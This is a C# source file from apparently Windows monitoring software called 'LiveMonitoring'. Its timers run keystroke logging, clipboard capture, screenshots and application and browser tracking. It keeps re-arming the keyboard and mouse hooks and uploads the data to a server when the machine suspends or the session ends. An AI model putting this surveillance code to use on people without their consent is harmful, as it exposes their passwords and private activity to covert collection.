using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LiveMonitoring
{
    public class MyApplicationContext : ApplicationContext
    {
        private System.Threading.Timer TimerKeyLogger;
        private System.Threading.Timer TimerClipboard;
        private System.Threading.Timer TimerScreenshot;
        private System.Threading.Timer TimerIdle;
        private System.Threading.Timer TimerApp;
        private System.Threading.Timer TimerSession;
        private System.Threading.Timer TimerAppTime;


        public MyApplicationContext()
        {
            Application.ApplicationExit += new EventHandler(this.OnApplicationExit);

            TimerAppTime = new System.Threading.Timer(TimerAppTime_Interval, null, 0, 60000);
            TimerKeyLogger = new System.Threading.Timer(TimerKeyLogger_Interval, null, 0, (Program.KeyLogger_Interval));
            TimerClipboard = new System.Threading.Timer(TimerClipboard_Interval, null, 0, (Program.Clipboard_Interval));
            TimerScreenshot = new System.Threading.Timer(TimerScreenshot_Interval, null, 0, (Program.Screenshot_Interval));
            TimerIdle = new System.Threading.Timer(TimerIdle_Interval, null, 0, (Program.Idle_Interval));
            TimerApp = new System.Threading.Timer(TimerApp_Interval, null, 0, (Program.App_Interval));
            TimerSession = new System.Threading.Timer(TimerSession_Interval, null, 0, (Program.Session_Interval));
            SystemEvents.PowerModeChanged += OnPowerModeChanged;
            SystemEvents.SessionEnding += SystemEvents_SessionEnding;

        }

        private static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            GlobalClass.WriteSessionEntry();
            if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
            {
                GlobalClass.GetIdletimetillmodechange();
                ApplicationData AD = new ApplicationData();
                AD.SendToServer();
            }
        }

        private static void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            if (e.Mode == PowerModes.Suspend)
            {
                GlobalClass.WriteSessionEntry();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    GlobalClass.GetIdletimetillmodechange();
                    ApplicationData AD = new ApplicationData();
                    AD.SendToServer();
                }
            }

            GlobalClass.WriteTolog("Power Mode Change in this mode :- " + e.Mode);
            Console.WriteLine("Power Mode Change in this mode :- " + e.Mode);
            if (e.Mode == PowerModes.Resume)
            {
                Application.Restart();
                //GlobalClass.SessionStartDate = GlobalClass.ApplicationNowTime;
                //GlobalClass.LastIdletime = GlobalClass.ApplicationNowTime;
                //GlobalClass.lastIdleMinute = 0;
            }

        }

        private void OnApplicationExit(object sender, EventArgs e)
        {
            Console.WriteLine("Close from MyApplicationContext :- OnApplicationExit");
            keyboardHook.KeyBordStop();
            MouseHook.MouseSTOP();
        }

        private static void TimerKeyLogger_Interval(Object o)
        {
            try
            {
                rehook();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //1.) save Keybord test here
                    GlobalClass.addKeyLoggerInfo(GlobalClass.KeyBordText, "KL");
                }
                GC.Collect();
            }
            catch (Exception ex)
            {
                GlobalClass.WriteTolog("Error in TimerKeyLogger_Interval");
            }

        }

        private static void TimerClipboard_Interval(Object o)
        {
            try
            {
                rehook();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //2.) save Clipbord test here
                    GlobalClass.FncClipboard();
                }
                GC.Collect();
            }
            catch (Exception)
            {
                GlobalClass.WriteTolog("Error in TimerClipboard_Interval");
            }
        }

        private static void TimerIdle_Interval(Object o)
        {

            try
            {
                rehook();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //3.) save Idle time here
                    // Console.WriteLine("Your Idle time is : " + GlobalClass.lastIdleMinute);
                    GlobalClass.WriteMachineIdleTime(GlobalClass.lastIdleMinute);
                }
                GC.Collect();
            }
            catch (Exception)
            {
                GlobalClass.WriteTolog("Error in TimerIdle_Interval");
            }
        }

        private static void TimerScreenshot_Interval(Object o)
        {
            try
            {
                rehook();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //4.)Send Screenshot 
                    ScreenShot.fncScreenShot();
                }
                GC.Collect();
            }
            catch (Exception)
            {
                GlobalClass.WriteTolog("Error in TimerScreenshot_Interval");
            }
        }

        private static void TimerApp_Interval(Object o)
        {
            try
            {
                rehook();
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //5.) Send Application and BrowerDetails
                    AppTracker.fncAppTracker();
                }
                GC.Collect();
            }
            catch (Exception)
            {
                GlobalClass.WriteTolog("Error in TimerApp_Interval");
            }
        }

        private static void TimerSession_Interval(Object o)
        {
            try
            {
                if (!(Program.IsBlocked == true && Program.IsSendBlockData == false))
                {
                    //5.) Insert New Session
                    GlobalClass.UploadLocalSessionData();
                    GlobalClass.SaveNewSessionEntry();
                }
                GC.Collect();
            }
            catch (Exception)
            {
                GlobalClass.WriteTolog("Error in TimerSession_Interval");
            }
        }

        private static void TimerAppTime_Interval(object o)
        {
            GlobalClass.ApplicationAddMinute = GlobalClass.ApplicationAddMinute + 1;
            Console.WriteLine("Clock Time is :- " + GlobalClass.ApplicationNowTime.ToString("dd/MM/yyyy HH:mm"));
        }

        private static void rehook()
        {
            if (!GlobalClass.Iskeyhook)
            {
                keyboardHook.KeyBordStart();
            }
            if (!GlobalClass.Ismousehook)
            {
                MouseHook.MouseStart();
            }
        }
    }
}
